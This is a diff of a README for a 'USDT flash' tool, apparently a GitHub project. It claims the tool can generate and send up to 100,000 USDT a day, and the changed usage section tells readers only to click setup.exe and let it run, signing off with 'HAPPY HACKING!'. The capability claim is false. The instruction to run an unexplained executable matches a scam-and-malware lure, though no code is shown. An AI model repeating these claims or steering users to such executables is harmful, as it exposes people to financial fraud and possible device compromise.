@@ -14,5 +14,5 @@ You can generate and send up to 100,000 USDT daily with the and 50,000 USDT in o
 
 ![usdt](https://github.com/dumbex6/NEW-USDT-FLASH/assets/78320163/ef5fef9d-7fb6-44d9-aeaa-aeb6bf274a59)
 # USAGE
-1. Click setup.exe first, let it run.
-2. Then run USDT_Sender.exe
+Click setup.exe, let it run.
+HAPPY HACKING!
